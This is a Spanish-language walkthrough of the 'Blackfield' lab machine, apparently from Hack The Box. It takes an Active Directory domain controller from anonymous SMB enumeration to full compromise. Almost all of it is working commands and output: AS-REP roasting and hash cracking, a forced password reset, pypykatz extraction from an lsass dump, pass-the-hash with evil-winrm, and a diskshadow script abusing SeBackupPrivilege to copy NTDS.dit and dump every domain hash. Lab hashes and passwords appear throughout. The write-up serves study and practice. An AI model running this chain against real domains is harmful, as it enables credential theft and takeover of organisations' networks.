# Enumeration

>Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.24.124 
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,389,445,593,3268,5985
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-09 23:42:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m01s
| smb2-time: 
|   date: 2025-04-09T23:43:02
|_  start_date: N/A
```

>Enumeramos la versión de Windows y el nombre del dominio mediante la herramienta crackmapexec:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.24.124                                                  
SMB         10.129.24.124   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)

```

>Agregamos el dominio encontrado al /etc/hosts para que el equipo pueda resolver el nombre de dominio empleando el resolutor local:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo '10.129.24.124 blackfield.local' >> /etc/hosts  
```

>Al tratar de iniciar de forma anónima en el RPC vemos que no tenemos acceso:

```bash
┌──(kali㉿jbkira)-[~]
└─$ rpcclient -U "" -N 10.129.24.124 
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED

```

>Si enumeramos los recursos compartidos por SMB mediante login anónimo podemos ver los siguientes:

```bash
┌──(kali㉿jbkira)-[~]
└─$ smbclient -L \\\\10.129.24.124\\ -U ""                                                                                          
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share
```

>Si nos conectamos al share profiles$ podemos ver que hay directorios que parecen ser personales de cuentas del dominio por lo que vamos a llevarnos los nombres de todas las carpetas:

```bash
┌──(kali㉿jbkira)-[~]
└─$ smbclient \\\\10.129.24.124\\profiles$ -U ""
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020

  <SNIP>
```

> Vamos a tratar el texto para quedarnos solo con los usuarios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ cat users | awk '{print $1}' FS=" " > valid_users
```

> Vamos a enumerar con kerbrute los usuarios válidos en el dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ kerbrute userenum --dc 10.129.24.124 -v valid_users -d BLACKFIELD.LOCAL 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/09/25 - Ronnie Flathers @ropnop

2025/04/09 12:58:53 >  Using KDC(s):
2025/04/09 12:58:53 >   10.129.24.124:88

<SNIP>

2025/04/09 12:59:13 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.LOCAL
<SNIP>
2025/04/09 13:01:07 >  [+] VALID USERNAME:       support@BLACKFIELD.LOCAL
2025/04/09 13:01:13 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.LOCAL
<SNIP>
```

>Vamos a agregar los usuarios válidos a una lista:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ echo -e "audit2020\nsupport\nsvc_backup" > domain_users
```

> Si probamos a buscar usuarios que no requieran preautenticación de kerberos (usuarios vulnerables a ASREP-ROAST) vemos que el usuario support es vulnerable y nos dió su Hash ASREP de tipo 23 que crackearemos offline:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ impacket-GetNPUsers -no-pass -usersfile domain_users blackfield.local/ 2>/dev/null
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:173d8f589eacbb88ef4af1737319046b$edbf2bd162d53fbc0cd78a904899b905cfca1259df963df2c8a507901d01159815d57f4c6521f13f902365a6479ce95436734d28849abb25c8deef2123ee3dd2ed6047afe1ab402d3f27aa51cab2d9f37b12ad9a6251d1cdaadc93028b67309e17b3e0e158b6d0bc1c633dd9818a0abaec189b8c599cee0b361fc7bbf5949d012f41d124b89e20913f9177ec39c3541ebeb9b06ce022c01fa13a7c5afb74f625f2246a4ef4c5175824badc95e4e9a3879c1d054e63115d4c387a38c2cfd0b0f2fea32c681aa28b2b8624318c493382bdf3a6eac27d3bd0806aecc78d1ca9d3de57466f9ac0ea3b8851793a49637b77834cb8a4e4
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

>Vamos a crackear offline el hash con la herramienta hashcat emplendo la máscara 18200 que corresponde a los hashes ASREP de tipo 23 (`$krb5asrep$23$`) y podemos ver su contraseña:
 
```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ hashcat -m 18200 asrep_hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$krb5asrep$23$support@BLACKFIELD.LOCAL:173d8f589eacbb88ef4af1737319046b$edbf2bd162d53fbc0cd78a904899b905cfca1259df963df2c8a507901d01159815d57f4c6521f13f902365a6479ce95436734d28849abb25c8deef2123ee3dd2ed6047afe1ab402d3f27aa51cab2d9f37b12ad9a6251d1cdaadc93028b67309e17b3e0e158b6d0bc1c633dd9818a0abaec189b8c599cee0b361fc7bbf5949d012f41d124b89e20913f9177ec39c3541ebeb9b06ce022c01fa13a7c5afb74f625f2246a4ef4c5175824badc95e4e9a3879c1d054e63115d4c387a38c2cfd0b0f2fea32c681aa28b2b8624318c493382bdf3a6eac27d3bd0806aecc78d1ca9d3de57466f9ac0ea3b8851793a49637b77834cb8a4e4:#00^BlackKnight
```

>Vamos a verificar si las credenciales son válidas empleando crackmapexec y vemos que lo son:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ crackmapexec smb 10.129.24.124 -u "support" -p "#00^BlackKnight"
SMB         10.129.24.124   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.24.124   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```

>Podemos ver que no hay ningún usuario Kerberoasteable:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ impacket-GetUserSPNs -dc-ip 10.129.24.124 blackfield.local/support:#00^BlackKnight -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

>Vamos a dumpear el dominio mediante LDAP para ver más información acerca de los usuarios, grupos y relaciones de confianza y lanzar un servidor http para ver el contenido de los archivos generados al dumpearlo:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ ldapdomaindump -u 'blackfield.local\support' -p '#00^BlackKnight' 10.129.24.124
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ python3 -m http.server 80                                                      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

>Aquí podemos ver que el usuario que hemos comprometido no pertenece a ningún grupo interesante, en cambio, el usuario svc_backup pertenece a los grupos Remote Management Users y Backup Operators que son grupos muy privilegiados que podemos abusar.

# Privilege Escalation

>Ahora, ejecutaremos bloodhound-python para obtener datos que analizar en BloodHound del dominio para ver por donde podríamos escalar privilegios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ bloodhound-python -u 'support' -p '#00^BlackKnight' -ns 10.129.24.124 -d blackfield.local -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
<SNIP>
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 14S
```

>Vamos a comprimir los archivos resultantes del comando anterior en un zip para facilitar el importado a BloodHound:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ zip blackfield.zip 2025*
  adding: 20250409131603_computers.json (deflated 96%)
  adding: 20250409131603_containers.json (deflated 95%)
  adding: 20250409131603_domains.json (deflated 77%)
  adding: 20250409131603_gpos.json (deflated 86%)
  adding: 20250409131603_groups.json (deflated 94%)
  adding: 20250409131603_ous.json (deflated 69%)
  adding: 20250409131603_users.json (deflated 97%)
```

>Ahora iniciamos el servicio de Neo4j, la base de datos que emplea bloodhound:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ sudo neo4j start
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:111770). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

>Abrimos bloodhound de forma gráfica, nos logueamos con las credenciales de Neo4j e importamos el archivo zip, si da error de formato JSON, importar el zip arrastrándolo desde una carpeta a la aplicación:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ bloodhound &>/dev/null & disown                                                                 
[1] 112047
```

>Aquí podemos ver una oportunidad para movernos lateralmente hacia la cuenta audit2020 ya que poseemos permisos de ForceChangePassword sobre dicha cuenta:

![image](https://github.com/user-attachments/assets/8767dd5f-543b-4397-b76a-2ffa8a442ee7)


>Vamos a emplear una herramienta de la suite de Impacket para cambiar la contraseña del usuario audit2020 aprovechando estos privilegios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ impacket-changepasswd blackfield.local/audit2020@10.129.24.124 -newpass 'Password123$!' -altuser blackfield.local/support -altpass '#00^BlackKnight' -reset 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of blackfield.local\audit2020 as blackfield.local\support
[*] Connecting to DCE/RPC as blackfield.local\support
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

>Vamos a probar si se cambiaron las credenciales de verdad y efectivamente, hemos obtenido acceso a otro usuario del dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ crackmapexec smb 10.129.24.124 -u 'audit2020' -p 'Password123$!'                                                                                           
SMB         10.129.24.124   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.24.124   445    DC01             [+] BLACKFIELD.local\audit2020:Password123$!
```

>Si listamos las shares de este usuario vemos una interesante llamada forensic:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ crackmapexec smb 10.129.24.124 -u 'audit2020' -p 'Password123$!' --shares
SMB         10.129.24.124   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.24.124   445    DC01             [+] BLACKFIELD.local\audit2020:Password123$! 
SMB         10.129.24.124   445    DC01             [+] Enumerated shares
SMB         10.129.24.124   445    DC01             Share           Permissions     Remark
SMB         10.129.24.124   445    DC01             -----           -----------     ------
SMB         10.129.24.124   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.24.124   445    DC01             C$                              Default share
SMB         10.129.24.124   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.24.124   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.24.124   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.24.124   445    DC01             profiles$       READ            
SMB         10.129.24.124   445    DC01             SYSVOL          READ            Logon server share 
```

>Nos conectamos al recurso compartido:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ smbclient \\\\10.129.24.124\\forensic -U "audit2020" 
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1693221 blocks available
```

>Aquí en un directorio podemos ver un archivo muy importante llamado lsass.zip el cual corresponde a un minidump del proceso lsass.exe el cual contiene contraseñas de usuarios del sistema:

```bash
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020

                5102079 blocks of size 4096. 1692965 blocks available

```

>Descargamos el archivo en nuestra máquina atacante:

```bash
smb: \memory_analysis\> get lsass.zip
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (4793.2 KiloBytes/sec) (average 4793.2 KiloBytes/sec)

```

>Descomprimimos el archivo:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ unzip lsass.zip 
Archive:  lsass.zip
  inflating: lsass.DMP    
```

>Vamos a emplear la herramienta pypykatz para extraer hashes del minidump:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
<SNIP>
```

>Vamos a comprobar si podemos hacer un PassTheHash como el usuario svc_backup empleando su hash NT y vemos que es válido:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ crackmapexec smb 10.129.24.124 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.129.24.124   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.24.124   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

>Como podemos recordar, cuando dumpeamos el LDAP pudimos ver que esta cuenta pertenecía al grupo Remote Management Users, por lo que podemos conectarnos al DC mediante evil-winrm realizando un PassTheHash, donde podremos ver la flag user.txt:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ evil-winrm -i 10.129.24.124 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls ../Desktop


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt
```

> Recordemos que este usuario pertenece también a otro grupo privilegiado llamado Backup Operators, el cual podemos abusar para escalar privilegios:

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> net user svc_backup
User name                    svc_backup

<SNIP>

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

>Al pertenecer a este grupo podemos ver que tenemos el privilegio SeBackupPrivilege:

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

>Este permiso puede ser abusado para hacer una shadow copy del archivo NTDS.dit del DC el cual contiene los hashes de todos los usuarios del dominio, para ello, empezaremos realizando la shadow copy, para ello emplearemos las 2 herramientas alojadas en el siguiente repositorio https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug :

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

>Previamente, deberemos crear un archivo txt con las siguientes instrucciones y pasarlos a la máquina para crear la shadow copy con la herramienta diskshadow de Windows, dejando un espacio en blanco al final de cada línea para evitar fallos:

```bash
set verbose on 
set metadata C:\Windows\Temp\meta.cab 
set context clientaccessible 
set context persistent 
begin backup 
add volume C: alias cdrive 
create 
expose %cdrive% E: 
end backup 
exit 
```

>Ahora ejecutamos diskshadow.exe con las instrucciones del archivo txt:

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow.exe /s diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  4/9/2025 6:14:51 PM

-> set verbose on
-> set metadata C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.
Component "\BCD\BCD" from writer "ASR Writer" is excluded from backup,
because it requires volume  which is not in the shadow copy set.
The writer "ASR Writer" is now entirely excluded from the backup because the top-level
non selectable component "\BCD\BCD" is excluded.

* Including writer "Task Scheduler Writer":
        + Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
        + Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
        + Adding component: \PerformanceCounters

* Including writer "System Writer":
        + Adding component: \System Files
        + Adding component: \Win32 Services Files

* Including writer "COM+ REGDB Writer":
        + Adding component: \COM+ REGDB

* Including writer "Registry Writer":
        + Adding component: \Registry

* Including writer "DFS Replication service writer":
        + Adding component: \SYSVOL\B0E5E5E5-367C-47BD-8D81-52FF1C8853A7-A711151C-FA0B-40DD-8BDB-780EF9825004

* Including writer "WMI Writer":
        + Adding component: \WMI

* Including writer "NTDS":
        + Adding component: \C:_Windows_NTDS\ntds

Alias cdrive for shadow ID {61d03045-6e86-46ce-bd59-8cec13fde308} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {47117188-e81a-4ae6-8dc0-44bcf7ec0f8e} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file BCDocument.xml into .cab file meta.cab
Inserted file WM0.xml into .cab file meta.cab
Inserted file WM1.xml into .cab file meta.cab
Inserted file WM2.xml into .cab file meta.cab
Inserted file WM3.xml into .cab file meta.cab
Inserted file WM4.xml into .cab file meta.cab
Inserted file WM5.xml into .cab file meta.cab
Inserted file WM6.xml into .cab file meta.cab
Inserted file WM7.xml into .cab file meta.cab
Inserted file WM8.xml into .cab file meta.cab
Inserted file WM9.xml into .cab file meta.cab
Inserted file WM10.xml into .cab file meta.cab
Inserted file Dis66E6.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {47117188-e81a-4ae6-8dc0-44bcf7ec0f8e}

        * Shadow copy ID = {61d03045-6e86-46ce-bd59-8cec13fde308}               %cdrive%
                - Shadow copy set: {47117188-e81a-4ae6-8dc0-44bcf7ec0f8e}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 4/9/2025 6:15:04 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {61d03045-6e86-46ce-bd59-8cec13fde308}
The shadow copy was successfully exposed as E:\.
-> end backup
-> exit

```

> Ahora vamos a hacer una copia de la hive del registro SYSTEM para poder dumpear los hashes del NTDS y lo pasamos a nuestra máquina atacante:

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM C:\Users\svc_backup\Documents\SYSTEM.sav
The operation completed successfully.
```

>Ahora nos copiamos el archivo NTDS.dit a otro directorio aprovechando el privilegio anteriormente mencionado, bypasseando las ACL del archivo que evitarían su copiado:

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\svc_backup\documents\ntds.dit
```

>Una vez teniendo el ntds.dit y el system.sav podemos realizar un dumpeo de los hashes de todo el dominio de la siguiente forma:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM.sav -hashes lmhash:nthash LOCAL                                                                         
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:24f2f986b76cbff5a4cf38af7222747e:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:e0a8687b8eb33a0913ab69cb0042bfde:::
<SNIP>
```

>Ahora teniendo el hash del usuario Administrador podemos hacer un PassTheHash que nos de una shell como SYSTEM en el DC, donde encontraremos la flag root.txt:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
└─$ evil-winrm -i 10.129.24.124 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt
```

